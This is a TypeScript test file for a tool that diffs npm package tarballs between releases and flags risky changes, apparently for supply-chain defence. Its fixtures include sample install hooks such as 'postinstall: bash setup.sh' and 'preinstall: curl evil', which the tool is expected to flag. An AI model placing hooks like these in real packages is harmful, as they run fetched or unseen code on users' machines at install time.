import { describe, expect, test } from "bun:test";
import { gzipSync } from "node:zlib";
import {
  parseTarball,
  diffTarballs,
  formatTarballDiffReport,
  type TarballSnapshot,
} from "../src/publish/tarball-diff.js";

function createTarEntry(name: string, content: string): Buffer {
  const header = Buffer.alloc(512, 0);
  header.write(name, 0, name.length, "utf-8");
  header.write("0000644", 100, 7, "utf-8");
  header.write("0000000", 108, 7, "utf-8");
  header.write("0000000", 116, 7, "utf-8");
  const sizeOct = content.length.toString(8).padStart(11, "0");
  header.write(sizeOct, 124, 11, "utf-8");
  header.write("0", 136, 1, "utf-8");
  header.write("ustar", 257, 5, "utf-8");

  const contentBuf = Buffer.from(content, "utf-8");
  const padded = Math.ceil(contentBuf.length / 512) * 512;
  const paddedContent = Buffer.alloc(padded);
  contentBuf.copy(paddedContent);
  return Buffer.concat([header, paddedContent]);
}

function createTgz(files: Record<string, string>): Buffer {
  const entries = Object.entries(files).map(([name, content]) =>
    createTarEntry(`package/${name}`, content),
  );
  entries.push(Buffer.alloc(512, 0));
  const tar = Buffer.concat(entries);
  return gzipSync(tar);
}

describe("tarball diff", () => {
  test("parseTarball extracts files and package.json", () => {
    const tgz = createTgz({
      "package.json": JSON.stringify({ name: "demo", version: "1.0.0", scripts: {} }),
      "index.js": "module.exports = {}",
    });
    const snapshot = parseTarball(tgz);
    expect(snapshot.files).toContain("package/index.js");
    expect(snapshot.packageJson.name).toBe("demo");
  });

  test("diffTarballs detects script and dependency changes", () => {
    const previous: TarballSnapshot = {
      files: ["package/index.js"],
      packageJson: {
        name: "demo",
        version: "1.0.0",
        scripts: { test: "node test.js" },
        dependencies: { lodash: "^4.0.0" },
      },
    };
    const current: TarballSnapshot = {
      files: ["package/index.js", "package/setup.sh"],
      packageJson: {
        name: "demo",
        version: "1.1.0",
        scripts: { test: "node test.js", postinstall: "bash setup.sh" },
        dependencies: { lodash: "^4.0.0", leftpad: "^1.0.0" },
      },
    };

    const report = diffTarballs(current, previous, {
      currentVersion: "1.1.0",
      previousVersion: "1.0.0",
    });

    expect(report.hasPrevious).toBe(true);
    expect(report.summary.scriptsAdded).toBe(1);
    expect(report.summary.depsAdded).toBe(1);
    expect(report.summary.filesAdded).toBe(1);
    expect(report.risky.length).toBeGreaterThan(0);
  });

  test("diffTarballs handles first publish", () => {
    const current: TarballSnapshot = {
      files: ["package/index.js"],
      packageJson: { name: "new-pkg", version: "0.1.0" },
    };
    const report = diffTarballs(current, null);
    expect(report.hasPrevious).toBe(false);
    expect(report.summary.filesAdded).toBe(1);
  });

  test("formatTarballDiffReport produces readable output", () => {
    const report = diffTarballs(
      { files: [], packageJson: { version: "2.0.0", scripts: { preinstall: "curl evil" } } },
      { files: [], packageJson: { version: "1.0.0" } },
      { currentVersion: "2.0.0", previousVersion: "1.0.0" },
    );
    const text = formatTarballDiffReport(report);
    expect(text).toContain("Tarball diff report");
    expect(text).toContain("Risk flags");
  });
});
